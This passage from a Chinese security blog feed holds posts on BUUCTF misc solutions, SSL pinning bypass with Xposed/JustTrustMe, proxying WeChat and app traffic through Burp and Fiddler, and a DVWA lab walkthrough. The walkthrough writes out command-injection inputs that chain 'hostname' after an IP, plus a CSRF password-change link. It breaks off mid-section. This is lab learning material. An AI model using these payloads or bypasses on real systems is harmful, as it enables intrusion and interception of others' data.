    <content type="html"><![CDATA[<p>还是misc类型深得我心<span id="more"></span></p><h1 id="00x0前言"><a href="#00x0前言" class="headerlink" title="00x0前言"></a>00x0前言</h1><p>    我个人感觉杂项就是压缩包与图片的花样式折腾。最近在做buuctf的misc，浅浅地记录下我的题解吧。</p><!--more--><p>    然后对下面的题目归个类：</p><h4 id="一、图片类型"><a href="#一、图片类型" class="headerlink" title="一、图片类型"></a>一、图片类型</h4><ul><li><p>gif逐帧分析：(题目1)</p></li><li><p>文件隐写：</p><ul><li><p>用foremost工具，分离出图片里面的压缩包文件(题目2,16,17,18)</p></li><li><p>图片中包含其他文件：用stegsolve的data extract处理(题目10,15)</p></li><li><p>图片为其他类型后缀：用stegsolve的data extract的预览可查看(题目22)</p></li></ul></li><li><p>十六进制查看图片：用winhex工具(题目3,6,9,20,21)</p></li><li><p>改文件后缀名：(题目4)</p></li><li><p>还原图片原始高宽度：(题目5)</p></li><li><p>查看图片属性：(题目18)</p></li></ul><h4 id="二、压缩包类型"><a href="#二、压缩包类型" class="headerlink" title="二、压缩包类型"></a>二、压缩包类型</h4><ul><li><p>破解加密压缩包：用ARCHPR工具(题目2,7,11,16,17,23)</p></li><li><p>zip伪加密：用zipcenop工具解密(题目12)</p></li></ul><h4 id="三、pcap包"><a href="#三、pcap包" class="headerlink" title="三、pcap包"></a>三、pcap包</h4><ul><li><p>wireshark搜索flag：(题目8,13)</p></li><li><p>wireshark追踪tcp流：(题目19,25)</p></li></ul><h4 id="四、音频文件"><a href="#四、音频文件" class="headerlink" title="四、音频文件"></a>四、音频文件</h4><ul><li>包含摩斯密码，利用在线音频文件转文本网站(题目24,28)</li></ul><h1 id="00x1金三胖"><a href="#00x1金三胖" class="headerlink" title="00x1金三胖"></a>00x1金三胖</h1><p>    题目是张gif，点开之后，感觉隐隐飘过一些红字，我甚至清晰地能看到了flag这几个字母，当然我眼神再好也瞧不全。想到通过分析gif的各帧就应该能看到。</p><p>    这里推荐一个在线网站：<a href="https://www.yasuotu.com/giffenjie">giffenjie</a></p><p>    然后就成功分解，成功看到答案：</p><p> <img src="/posts/c662/1.png" class></p><p>    拼接起来就是flag{he11ohongke}</p><h1 id="0x02-二维码"><a href="#0x02-二维码" class="headerlink" title="0x02 二维码"></a>0x02 二维码</h1><p>    题目是一张二维码，扫描之后也并没有发现flag，然后用工具foremost尝试看是否隐写，啊果然，里面还藏着一个压缩包。</p><p> <img src="/posts/c662/2.png" class></p><p>    然后我兴致冲冲地打开，里面有一个txt文档居然加密了。我不甘心，利用工具ZipCenOp检验它是否是伪加密，压缩包拖进去，文件倒是不加密了，直接损坏了，看来是真加密呀。于是只能使用工具ARCHPR对这个zip进行暴力破解密码，看到这个txt叫4number.txt，应该是提示密码是4个数字，所以打开工具，设置范围0000——9999，设置最小长度和最大长度都是4，成功破解密码为7639。</p><p> <img src="/posts/c662/2_2.png" class></p><p>    打开文档，得到CTF{vjpw_wnoei}，所以答案为flag{vjpw_wnoei}</p><h1 id="0x03-你竟然赶我走"><a href="#0x03-你竟然赶我走" class="headerlink" title="0x03 你竟然赶我走"></a>0x03 你竟然赶我走</h1><p>    题目是一张图片，然后我顺手就用十六进制工具winhex打开了图片，看到文本的最后就藏着flag。不错，几秒钟就解密了，我都还没缓过神就看到答案了。</p><p> <img src="/posts/c662/3.png" class></p><p>    得到题解为flag{stego_is_s0_bor1ing}</p><h1 id="0x04-n种方法解决"><a href="#0x04-n种方法解决" class="headerlink" title="0x04 n种方法解决"></a>0x04 n种方法解决</h1><p>    题目是一个KEY.exe，我尝试打开，无果，然后我就开始改后缀名了，改成KEY.txt，打开是一段图片的Base64编码的DataURI形式。</p><pre class="line-numbers language-bash"><code class="language-bash">图片的Base64编码的DataURI形式：data:image/jpg<span class="token punctuation">;</span>base64,编码内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>    看到这个格式的内容直接往浏览器的网址里面一放，然后神奇的事情就会发生，可以还原成图片啦，是一张二维码。扫描就可得到题解为flag{dca57f966e4e4e31fd5b15417da63269}。</p><p> <img src="/posts/c662/4.png" class></p><h1 id="0x05-大白"><a href="#0x05-大白" class="headerlink" title="0x05 大白"></a>0x05 大白</h1><p>    看到题目提示说“看不到图？ 是不是屏幕太小了”，然后发现题目给了一张大白的图片，根据提示猜测是不是图片未显示完全。然后了解了一下png图片的基本构造：</p><img src="/posts/c662/5.png" class><p>    用一个python脚本可以算出图片的原始大小的高度和宽度：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">import</span> os<span class="token function">import</span> binascii<span class="token function">import</span> struct crcbp <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"dabai.png"</span>, <span class="token string">"rb"</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#打开图片</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>2000<span class="token punctuation">)</span>:     <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>2000<span class="token punctuation">)</span>:         data <span class="token operator">=</span> crcbp<span class="token punctuation">[</span>12:16<span class="token punctuation">]</span> + \             struct.pack<span class="token punctuation">(</span><span class="token string">'>i'</span>, i<span class="token punctuation">)</span>+struct.pack<span class="token punctuation">(</span><span class="token string">'>i'</span>, j<span class="token punctuation">)</span>+crcbp<span class="token punctuation">[</span>24:29<span class="token punctuation">]</span>        crc32 <span class="token operator">=</span> binascii.crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> 0xffffffff         if<span class="token punctuation">(</span>crc32 <span class="token operator">==</span> 0x6D7C7135<span class="token punctuation">)</span>: <span class="token comment" spellcheck="true">#图片当前CRC </span>        print<span class="token punctuation">(</span>i, j<span class="token punctuation">)</span>         print<span class="token punctuation">(</span><span class="token string">'hex:'</span>, hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span>, hex<span class="token punctuation">(</span>j<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>    得到结果，的确和现在图片大小不一致：</p><p> <img src="/posts/c662/5_2.png" class></p><p>     然后用十六进制编辑器winhex打开图片，将对应的高度修改为正确的并保存，就可以看到完整的图片啦。</p><img src="/posts/c662/5_3.png" class><p>    题目题解为flag{He1l0_d4_ba1}</p><p> <img src="/posts/c662/5_4.png" class></p><h1 id="00x6-乌镇峰会种图"><a href="#00x6-乌镇峰会种图" class="headerlink" title="00x6 乌镇峰会种图"></a>00x6 乌镇峰会种图</h1><p>    用winhex打开图片，在文本的最后就能看到flag，题解为flag{97314e7864a8f62627b26f3f998c37f1}</p><p> <img src="/posts/c662/6.png" class></p><h1 id="0x07-基础破解"><a href="#0x07-基础破解" class="headerlink" title="0x07 基础破解"></a>0x07 基础破解</h1><p>    题目已经给出提示啦，是个四位数字的加密压缩包。上破解工具archrp，得到口令为2563。解开是一串base64的字符串，直接题解不对，进行解码提交就行啦。</p><p>    题解为flag{70354300a5100ba78068805661b93a5c}</p><p> <img src="/posts/c662/7.png" class></p><h1 id="0x08-wireshark"><a href="#0x08-wireshark" class="headerlink" title="0x08 wireshark"></a>0x08 wireshark</h1><p>    用wireshark打开题目，搜索关键字flag，然后就看到了答案，提示说管理员密码就是题解。题解为flag{ffb7567a1d4f4abdffdb54e022f8facd}</p><p> <img src="/posts/c662/8.png" class></p><h1 id="0x09-文件中的秘密"><a href="#0x09-文件中的秘密" class="headerlink" title="0x09 文件中的秘密"></a>0x09 文件中的秘密</h1><p>    用winhex打开图片，搜索“flag”没看到，然后我稍微往下一番，就看到经过变形的flag，题解为flag{870c5a72806115cb5439345d8b014396}</p><p> <img src="/posts/c662/9.png" class></p><h1 id="0x10-LSB"><a href="#0x10-LSB" class="headerlink" title="0x10 LSB"></a>0x10 LSB</h1><p>    提到了LSB就用stegsolve打开图片，在左右翻看图片时red plane 0上方好像有一行字，用data extract处理隐写的图片。</p><p> <img src="/posts/c662/10.png" class></p><p>    将信息保存为png图片格式，打开是一张二维码，扫描可得到题解为flag{1sb_i4_s0_Ea4y}</p><p> <img src="/posts/c662/10_2.png" class></p><h1 id="0x11-rar"><a href="#0x11-rar" class="headerlink" title="0x11 rar"></a>0x11 rar</h1><p>    题目提示是一个纯四位数字加密的压缩包，直接用archpr进行暴力破解，得到口令为8795。成功解密压缩包之后，可以看到题目的题解为flag{1773c5da790bd3caff38e3decd180eb7}</p><img src="/posts/c662/11.png" class><h1 id="0x12-zip伪加密"><a href="#0x12-zip伪加密" class="headerlink" title="0x12 zip伪加密"></a>0x12 zip伪加密</h1><p>    都说了是伪加密了，我就不用winhex改了，直接用工具自zipcenop对伪加密的zip压缩包进行解密，得到flag{Adm1N-B2G-kU-SZIP}</p><p> <img src="/posts/c662/12.png" class></p><h1 id="0x13-被嗅探的流量"><a href="#0x13-被嗅探的流量" class="headerlink" title="0x13 被嗅探的流量"></a>0x13 被嗅探的流量</h1><p>    用wireshark打开题目，查找flag，因为提示说是什么类型的文件，在搜索到的分组字节流中共有两端，第二个就是一个图片类型的字节流。于是打开，在里面发现了题解flag{da73d88936010da1eeeb36e945ec4b97}</p><p> <img src="/posts/c662/13.png" class></p><h1 id="0x14-qr"><a href="#0x14-qr" class="headerlink" title="0x14 qr"></a>0x14 qr</h1><p>`直接解密二维码就行， 题解为flag{878865ce73370a4ce607d21ca01b5e59}</p><h1 id="0x15-镜子里面的世界"><a href="#0x15-镜子里面的世界" class="headerlink" title="0x15 镜子里面的世界"></a>0x15 镜子里面的世界</h1><p>    仔细放大这张照片，完全看不到什么，用stegsolve打开，在左右查看时，发现有几帧的左上角似乎有字，比如red plane 0。但看不清楚，于是用data extract勾选rgb之后预览，可以看到题解flag{st3g0_saurus_wr3cks}：</p><p> <img src="/posts/c662/15.png" class></p><h1 id="0x16-ningen"><a href="#0x16-ningen" class="headerlink" title="0x16 ningen"></a>0x16 ningen</h1><p>    题目是一张图片，而提示却说到了文件密码是4位数，所以这张图片里面肯定隐写了，用foremost提取，果然看到一个加密的zip压缩包。</p><p>    然后用archpr暴力破解得到口令为8368。解开加密文件，得到题解为flag{b025fc9ca797a67d2103bfbc407a6d5f}</p><p> <img src="/posts/c662/16_2.png" class></p><h1 id="0x17-小明的保险箱"><a href="#0x17-小明的保险箱" class="headerlink" title="0x17 小明的保险箱"></a>0x17 小明的保险箱</h1><p>    和上一题一模一样的思路，暴力破解得到口令为7869，解开文件得到题解为flag{75a3d68bf071ee188c418ea6cf0bb043}</p><h1 id="0x18-爱因斯坦"><a href="#0x18-爱因斯坦" class="headerlink" title="0x18 爱因斯坦"></a>0x18 爱因斯坦</h1><p>    看起来图片没什么异常，用foremost尝试分离，得到一个加密的zip文件。但是没有任何密码提示。查看原始图片的属性，发现有一个备注“this_is_not_password”，尝试解密文件，解密成功。得到题解为flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p><p> <img src="/posts/c662/18.png" class></p><h1 id="0x19-easycap"><a href="#0x19-easycap" class="headerlink" title="0x19 easycap"></a>0x19 easycap</h1><p>    用wireshark打开题目，查找分组字节流的flag，没有找到，然后仔细一番检查，好像没有什么特别的。然后随便右击一个字节流，在追踪流中选择TCP流：</p><p>  <img src="/posts/c662/19.png" class></p><p>然后就神奇的看到了flag，题解为flag{385b87afc8671dee07550290d16a8071}</p><p>  <img src="/posts/c662/19_2.png" class></p><h1 id="0x20-隐藏的钥匙"><a href="#0x20-隐藏的钥匙" class="headerlink" title="0x20 隐藏的钥匙"></a>0x20 隐藏的钥匙</h1><p>    用winhex打开图片，搜索flag，就能看到用base64加密的字符串，解密即得到题解：flag{377cbadda1eca2f2f73d36277781f00a}</p><p>  <img src="/posts/c662/20.png" class></p><h1 id="0x21-另外一个世界"><a href="#0x21-另外一个世界" class="headerlink" title="0x21 另外一个世界"></a>0x21 另外一个世界</h1><p>    用winhex打开该图片，发现在末尾有一串二进制数字，以八个为一组，对照ascii码，得到题解为flag{koekj3s}</p><p>  <img src="/posts/c662/21.png" class></p><h1 id="0x22-FLAG"><a href="#0x22-FLAG" class="headerlink" title="0x22 FLAG"></a>0x22 FLAG</h1><p>    题目是一张图片，一顿找之后没有结果，然后用stegsolve打开，用data extract打开，rgb调成0之后，预览看到是一个zip的文件，所以将其保存为zip。</p><p>  <img src="/posts/c662/22.png" class></p><p>    在对这个压缩包解压时提示文件已经损坏，用WinRAR里面的工具修复，然后继续解压，用记事本打开这个1文件，里面发现了题解：</p><p>  <img src="/posts/c662/22_2.png" class></p><p>    所以题目题解为flag{dd0gf4c3tok3yb0ard4g41n~~~}</p><h1 id="0x23-神秘龙卷风"><a href="#0x23-神秘龙卷风" class="headerlink" title="0x23 神秘龙卷风"></a>0x23 神秘龙卷风</h1><p>    根据题目提示，先用工具archpr暴力破解加密压缩包，得到口令为5463：</p><p>  <img src="/posts/c662/23.png" class></p><p>    解密之后打开文本，发现是由+.&gt;组成的字符串，百度了一下由这种字符串组成的加密方式，叫做brainfuck编码。这里有个网址记录的加密方式很全：<a href="http://www.javashuo.com/article/p-covkznoi-nz.html">ctf常见加密</a>。然后去解密网站<a href="https://www.splitbrain.org/services/ook">brainfuck</a>，点击brainfuck to text，得到flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><p> <img src="/posts/c662/23.png" class></p><h1 id="0x24-假如给我三天光明"><a href="#0x24-假如给我三天光明" class="headerlink" title="0x24 假如给我三天光明"></a>0x24 假如给我三天光明</h1><p>    题目有一个加密压缩包和一张图片。根据题目意思，联想到图片下面的图形应该是盲文，然后解密得到字符串kmdonowg，成功解开压缩包：</p><p> <img src="/posts/c662/24.png" class></p><p>    是一段音频文件，一听就觉得是摩斯密码，自己尝试用耳朵听了一下，不行，什么都听不出来，还是直接找网址转换吧。用这个<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">morsecode</a>可以对上传的音频文件转为文本：</p><p> <img src="/posts/c662/24_2.png" class></p><p>    提交flag为flag{wpei08732?23dz}时正确。</p><h1 id="0x25-数据包中的线索"><a href="#0x25-数据包中的线索" class="headerlink" title="0x25 数据包中的线索"></a>0x25 数据包中的线索</h1><p>    用wireshark打开题目，点击查看http的tcp追踪流：</p><p> <img src="/posts/c662/25.png" class></p><p>    发现下面的一长串字符串像图片的 Base64 编码的 DataURI 形式。于是复制下面的字符串，在前面加上data:image/jpg;base64,放在浏览器中，出现了一张图片。或者这里也可以直接把字符串放到base64解密网站，可以得到一张图片。</p><p> <img src="/posts/c662/25_2.png" class></p><h1 id="0x26-后门查杀"><a href="#0x26-后门查杀" class="headerlink" title="0x26 后门查杀"></a>0x26 后门查杀</h1><p>    这题其实下载的时候，电脑的安全管家就提示了哪个文件里面可能包含木马，或者把整个文件夹放到病毒扫描里面查找。这里我随便找了几个文件，最后在html——&gt;include——&gt;include.php中看到了密码：所以题解为flag{6ac45fb83b3bc355c024f5034b947dd3}</p><img src="/posts/c662/26.png" class>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xposed+JustTrustMe绕过SSL Pinning</title>
    <link href="/posts/b480.html"/>
    <url>/posts/b480.html</url>
    
    <content type="html"><![CDATA[<p>单向认证绕过方式GET之一</p><span id="more"></span><p>    当APP是HTTPS时，则单纯的使用Burpsuite无法抓取数据包，原因是APP启用了SSL Pinning(又叫做“SSL证书绑定”)。把这个框架安装了防止之后有数据包抓取不到。</p><h1 id="1、安装Xposed框架"><a href="#1、安装Xposed框架" class="headerlink" title="1、安装Xposed框架"></a>1、安装Xposed框架</h1><p>    注意：只有 <strong>安卓5</strong> 和 7020及以后模拟器版本的 <strong>安卓7 32位</strong> 支持xposed框架。</p><p>在应用商店搜到到Xposed，下载完成之后，选择Version 89，选择install：</p><img src="/posts/b480/6.png" class><img src="/posts/b480/6_2.png" class><p>    然后重启模拟器，再次打开Xposed框架，完成后会提示框架已经激活：</p><img src="/posts/b480/6_3.png" class><h1 id="2-、安装JustTrustMe"><a href="#2-、安装JustTrustMe" class="headerlink" title="2 、安装JustTrustMe"></a>2 、安装JustTrustMe</h1><p>    在github上面可搜索到：<a href="https://github.com/Fuzion24/JustTrustMe/releases">JustTrustMe</a></p><p>    安装完成之后，进入Xposed，点击左上角，选择模块，勾选JustTrustMe</p><img src="/posts/b480/6_4.png" class><p>    安装完成之后，重启模拟器，APP的HTTPS数据包就可以抓取到了。</p>]]></content>
    
    
    <categories>
      
      <category>Android渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Xpose</tag>
      
      <tag>JustTrustMe</tag>
      
      <tag>app单向认证绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>截获Android端数据包</title>
    <link href="/posts/621a.html"/>
    <url>/posts/621a.html</url>
    
    <content type="html"><![CDATA[<p> 关于在安卓模拟器和本机电脑上拦截微信公众号、小程序、APP数据包方法。<span id="more"></span></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>        前一段时间有在做捕获微信公众号数据包的测试，然后顺便下载了个模拟器，想着琢磨一下小程序和app的拦截使用，整理了一下笔记，下面是关于在模拟器和本机电脑上拦截微信公众号，小程序，APP数据包的做法。</p><p>        准备工具如下：</p><ul><li><p>BurpSuite</p></li><li><p>fiddler</p></li><li><p>夜神模拟器</p></li><li><p>微信客户端3.6版本（现在的微信高版本不得行咯）</p></li></ul><!--more--><h1 id="1、在本地电脑上拦截微信公众号数据包"><a href="#1、在本地电脑上拦截微信公众号数据包" class="headerlink" title="1、在本地电脑上拦截微信公众号数据包"></a>1、在本地电脑上拦截微信公众号数据包</h1><p>    在本地电脑上可以通过下面这种方式拦截公众号的数据包，但是拦截不到小程序的数据包。</p><h2 id="step-1-设置代理服务器"><a href="#step-1-设置代理服务器" class="headerlink" title="step 1 设置代理服务器"></a>step 1 设置代理服务器</h2><p>    打开默认浏览器的Internet选项——点击”连接“——选择”局域网设置”</p><img src="/posts/621a/1.png" class><p>    打开代理服务器，配置一个地址和端口：</p><img src="/posts/621a/1_2.png" class><h2 id="step-2-burp配置"><a href="#step-2-burp配置" class="headerlink" title="step 2 burp配置"></a>step 2 burp配置</h2><p>    在burp中的proxy——options——添加代理（添加和上一步代理服务器一样的ip和端口即可）</p><img src="/posts/621a/1_3.png" class><h1 id="2、-在本地电脑上拦截微信小程序数据包"><a href="#2、-在本地电脑上拦截微信小程序数据包" class="headerlink" title="2、 在本地电脑上拦截微信小程序数据包"></a>2、 在本地电脑上拦截微信小程序数据包</h1><p>    拦截小程序的数据包，可以通过fiddle来拦截。同样，用fiddle也可以拦截到公众号的数据包。但是注意哦，只能使用旧版（3.6版本）的电脑微信，3.7版本的不行。然后建议先删除电脑上WMPFRuntime文件夹下的内容，再用管理员身份重新运行微信。</p><pre class="line-numbers language-bash"><code class="language-bash">C:\Users\Administrator\AppData\Roaming\Tencent\WeChat\XPlugin\Plugins\WMPFRuntime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="step-1-配置fiddler捕获HTTPS会话和端口连接设置"><a href="#step-1-配置fiddler捕获HTTPS会话和端口连接设置" class="headerlink" title="step 1 配置fiddler捕获HTTPS会话和端口连接设置"></a>step 1 配置fiddler捕获HTTPS会话和端口连接设置</h2><p>    先下载并安装<a href="https://www.telerik.com/download/fiddler">Fiddler</a>，安装完成之后，打开fiddler，然后点击Tools——Options——HTTPS——勾选Decrypt HTTPS traffic——选择Yes——点击OK，完成配置。</p><img src="/posts/621a/2.png" class><h2 id="step-2-设置fiddler代理"><a href="#step-2-设置fiddler代理" class="headerlink" title="step 2 设置fiddler代理"></a>step 2 设置fiddler代理</h2><p>    点击Tools——Options——Connections——设置端口——勾选Allow remote computers to connect——点击OK，设置代理完成——重启fiddler配置生效。</p><img src="/posts/621a/2_2.png" class><h2 id="step-3-配置微信代理"><a href="#step-3-配置微信代理" class="headerlink" title="step 3 配置微信代理"></a>step 3 配置微信代理</h2><p>    打开电脑微信的登录界面，右上角有个设置的图标，进去之后，打开使用代理。</p><pre class="line-numbers language-bash"><code class="language-bash">地址：可以为环回地址127.0.0.1，或者为下面的fiddler中提到的online中圈出来的地址。端口：一定要注意和第二步中connections中设置的端口号一致。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/621a/2_3.png" class><img src="/posts/621a/2_4.png" class><p>    连接成功，打开小程序即可拦截到数据包。</p><h1 id="3、-fiddler和burp串联使用"><a href="#3、-fiddler和burp串联使用" class="headerlink" title="3、 fiddler和burp串联使用"></a>3、 fiddler和burp串联使用</h1><p>    fiddler拦截数据包挺快的，但是我还是感觉用burp比较顺手呀，正好它们可以串联使用。</p><h2 id="step-1-配置burp"><a href="#step-1-配置burp" class="headerlink" title="step 1 配置burp"></a>step 1 配置burp</h2><p>    打开burp，配置一个代理，这里我设置为127.0.0.1:7777（注意这里设置的端口号不要和fiddle中connections中的端口号（一般默认为8888）一致。我试了一下，虽然能将fiddler的包同步到burp，但fiddler中没有显示抓包流量，而且无法访问浏览器。）</p><img src="/posts/621a/3.png" class><h2 id="step-2-配置fiddler"><a href="#step-2-配置fiddler" class="headerlink" title="step 2 配置fiddler"></a>step 2 配置fiddler</h2><p>    在fiddler中的Tools——Options——Gateway——选择Manual Proxy Configuration配置与第一步相同的地址和端口，这里为127.0.0.1:7777</p><img src="/posts/621a/3_2.png" class><p>    然后再次打开该窗口，点击show current gateway info可以测试是否连接成功，这样就是成功：</p><img src="/posts/621a/3_3.png" class><p>    此时，通过fiddler的包也转发到了burp中的Proxy——HTTP history中。而且可以在burp中拦截到数据包了。</p><h1 id="4、在夜神模拟器上用burp拦截微信公众号或小程序数据包"><a href="#4、在夜神模拟器上用burp拦截微信公众号或小程序数据包" class="headerlink" title="4、在夜神模拟器上用burp拦截微信公众号或小程序数据包"></a>4、在夜神模拟器上用burp拦截微信公众号或小程序数据包</h1><h2 id="step-1-配置网络"><a href="#step-1-配置网络" class="headerlink" title="step 1 配置网络"></a>step 1 配置网络</h2><p>    打开夜神模拟器——找到WLAN设置——长按那个网络——点击修改网络：</p><img src="/posts/621a/4.png" class><p>    将代理改为手动，ip为电脑任一内网ip地址（不清楚可以在cmd中使用ipconfig命令查看，我这里设置为192.168.187.1），端口自己设置为任一没被占用的端口（我这里设置为8888），点击保存：</p><img src="/posts/621a/4_2.png" class><h2 id="step-2-配置burp代理"><a href="#step-2-配置burp代理" class="headerlink" title="step 2 配置burp代理"></a>step 2 配置burp代理</h2><p>    在burp中，proxy——options——添加代理（添加的和上一步在夜神模拟器网络中的ip和端口一致）</p><img src="/posts/621a/4_3.png" class><h2 id="step-3-下载证书并安装"><a href="#step-3-下载证书并安装" class="headerlink" title="step 3 下载证书并安装"></a>step 3 下载证书并安装</h2><p>    其实前面两步完成之后，已经可以用burp拦截到模拟器中公众号数据包了，但是无法访问浏览器，而且拦截小程序的数据包还有点问题，所以还是乖乖把证书下载吧。</p><p>    在本机上访问之前配置的ip:端口（我这里为192.168.187.1:8888），下载burp证书：</p><img src="/posts/621a/4_4.png" class><p>    将证书的后缀der修改为cer，然后拖拽到夜神模拟器上面：</p><img src="/posts/621a/4_5.png" class><p>    在夜神模拟器中，进入设置——安全——从SD卡安装——选择刚刚证书的位置，证书名称任意取。第一次安装的时候可能需要设置pin码，自己任意设置即可。</p><img src="/posts/621a/4_6.png" class><p>    此时，打开burp，在模拟器里面访问微信的公众号或者小程序即可抓取到数据包啦。如果此时还是拦截不到数据包，建议换成低版本的Android再试试，我改成Android 5之后就能正常抓包了，之前用Android 7硬是抓不到小程序包，真难受。</p><h1 id="5、fiddler抓取模拟器上的APP数据包"><a href="#5、fiddler抓取模拟器上的APP数据包" class="headerlink" title="5、fiddler抓取模拟器上的APP数据包"></a>5、fiddler抓取模拟器上的APP数据包</h1><h2 id="step-1-在模拟器配置网络"><a href="#step-1-在模拟器配置网络" class="headerlink" title="step 1 在模拟器配置网络"></a>step 1 在模拟器配置网络</h2><p>    跟之前设置模拟器的网络一样，进入WLAN，修改网络。</p><pre class="line-numbers language-bash"><code class="language-bash">地址：本地地址或ipv4地址。端口：需和在fiddler中connections的端口一致。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/621a/5.png" class><h2 id="step-2-安装fiddler证书"><a href="#step-2-安装fiddler证书" class="headerlink" title="step 2 安装fiddler证书"></a>step 2 安装fiddler证书</h2><p>    在模拟器中下载证书（访问上一步配置的地址:端口），然后还是在模拟器中打开设置——安全——从SD卡安装证书——找到刚刚下载的证书——任意为证书取名即可。</p><img src="/posts/621a/5_2.png" class><p>此时，通过fiddler已经能拦截到微信公众号，小程序，app等的数据包啦。</p><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
    
    
    <categories>
      
      <category>Android渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android抓包</tag>
      
      <tag>fiddler</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa靶场</title>
    <link href="/posts/8409.html"/>
    <url>/posts/8409.html</url>
    
    <content type="html"><![CDATA[<p>这个靶场是几个月前开始的，然后中间可能因为有各种事情拖沓，还剩了一点，终于把它全部弄完啦，真不容易啊。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我把dvwa靶场的三个等级low，medium，high每关都做出了相应的题解，应该看起来会清晰一点。</p><p>我这里引用的dvwa靶场是来自<a href="https://github.com/digininja/DVWA/archive/master.zip">https://github.com/digininja/DVWA/archive/master.zip</a> 记得看readme文件，配置好相关环境，然后就可以开始啦。</p><!--more--><h1 id="1、Burte-Force"><a href="#1、Burte-Force" class="headerlink" title="1、Burte Force"></a>1、Burte Force</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>使用burp暴力破解，得到账户名密码为：admin/password</p><p>然后尝试登录，登录成功</p><p> <img src="/posts/8409/1.png" class></p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>和low一样</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>和low一样</p><h1 id="2、Command-Injection"><a href="#2、Command-Injection" class="headerlink" title="2、Command Injection"></a>2、Command Injection</h1><h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p>执行命令</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1 <span class="token operator">|</span> <span class="token function">hostname</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可得到主机名，可命令执行得到其他敏感信息。</p><p> <img src="/posts/8409/2.png" class></p><h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><p>和low一样</p><h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><p>执行命令</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1 <span class="token operator">||</span> <span class="token function">hostname</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可得到主机名，可命令执行得到其他敏感信息。</p><p> <img src="/posts/8409/2_2.png" class></p><h1 id="3、CSRF"><a href="#3、CSRF" class="headerlink" title="3、CSRF"></a>3、CSRF</h1><h2 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h2><p>用burp抓包分析，没有设置token，也不需要输入原来密码，通过get请求来提交修改信息的，可以直接修改密码，然后复制url，只要受害者点击该url密码就会被修改。</p><p>  <img src="/posts/8409/3.png" class></p><p>将密码改为222，复制url:</p><pre class="line-numbers language-bash"><code class="language-bash">http://127.0.0.1:8099/dvwa/vulnerabilities/csrf/?password_new<span class="token operator">=</span>222<span class="token operator">&amp;</span>password_conf<span class="token operator">=</span>222<span class="token operator">&amp;</span>Change<span class="token operator">=</span>Change<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当点击此链接时，密码被修改：</p><p>  <img src="/posts/8409/3_2.png" class></p><p>后来有了另一种思路，一般csrf看Referer和origin字段，如果去掉这两个字段响应还一样，而且没加什么验证的手段，则可能存在csrf漏洞，此时可以在burp生成poc，验证一下：</p><p>  <img src="/posts/8409/3_3.png" class></p><h2 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h2><p>和low一样</p><h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><p>和low一样</p><h1 id="4、File-Inclusion"><a href="#4、File-Inclusion" class="headerlink" title="4、File Inclusion"></a>4、File Inclusion</h1><h2 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h2><p>里面有三个文件，点开可以看到在url中是get方式的。</p><p>当尝试输入：</p><p>file4.php</p><p>发现了一个隐藏的文件：</p><p>  <img src="/posts/8409/4.png" class></p><h2 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h2><p>和low一样</p><h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2><p>和low一样</p><h1 id="5、File-Upload"><a href="#5、File-Upload" class="headerlink" title="5、File Upload"></a>5、File Upload</h1><h2 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h2><p>尝试上传php后缀文件，比如1.php文件，发现上传成功：</p><p>   <img src="/posts/8409/5.png" class></p><p>可以看到文件的路径暴露出来了，然后利用第4关的文件上传漏洞，可以访问到：</p><p>   <img src="/posts/8409/5_2.png" class></p><h2 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h2><p>当尝试上传php后缀时，发现上传不成功</p><p> <img src="/posts/8409/5_3.png" class></p><p>用burp抓包分析，看到显示了Content-Type</p><p> 